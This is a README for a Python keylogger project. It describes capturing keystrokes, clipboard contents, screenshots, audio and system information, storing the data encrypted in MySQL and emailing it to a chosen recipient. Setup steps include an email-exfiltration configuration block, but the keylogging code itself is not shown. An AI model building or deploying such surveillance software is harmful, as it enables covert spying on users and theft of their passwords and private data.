# Keylogger Project

This project implements a keylogger that logs keystrokes, clipboard data, screenshots, and audio recordings. The collected data is encrypted and stored in a MySQL database. The data is also sent via email to a specified email address.

## Features

- Logs keystrokes
- Captures clipboard data
- Takes screenshots
- Records audio
- Collects system information
- Encrypts data before storing in MySQL database
- Sends encrypted data via email

## Setup

### Prerequisites

- Python 3.x
- MySQL server
- `pip` (Python package installer)

### Installation

1. **Clone the Repository:**

    ```sh
    git clone https://github.com/your-username/your-repo.git
    cd your-repo
    ```

2. **Install the Required Python Packages:**

    Ensure you have `pip` installed. Then, install the required packages using the `requirements.txt` file:

    ```sh
    pip install -r requirements.txt
    ```

3. **Setup MySQL Database:**

    - Create a MySQL database named `keylogger`.
    - Create a table named `files` with the following structure:

      ```sql
      CREATE TABLE files (
          id INT AUTO_INCREMENT PRIMARY KEY,
          filename VARCHAR(255) NOT NULL,
          file_data LONGBLOB NOT NULL,
          upload_date DATE NOT NULL,
          upload_time TIME NOT NULL
      );
      ```

4. **Configure Email and Database Credentials:**

    - Open the Python script and locate the email and MySQL configuration section.
    - Replace the placeholders with your actual email and database credentials.

    ```python
    # Email credentials
    email_address = "your-email@gmail.com"
    password = "your-email-password"
    toaddr = "recipient-email@gmail.com"

    # MySQL credentials
    connection = mysql.connector.connect(
        host="localhost",
        user="your-mysql-username",
        password="your-mysql-password",
        database="keylogger"
    )
    ```



### Important Notes:

1. This code is a keylogger and is typically considered malicious. Use it responsibly and ensure you have explicit permission from the system owner. Misuse can lead to legal consequences.
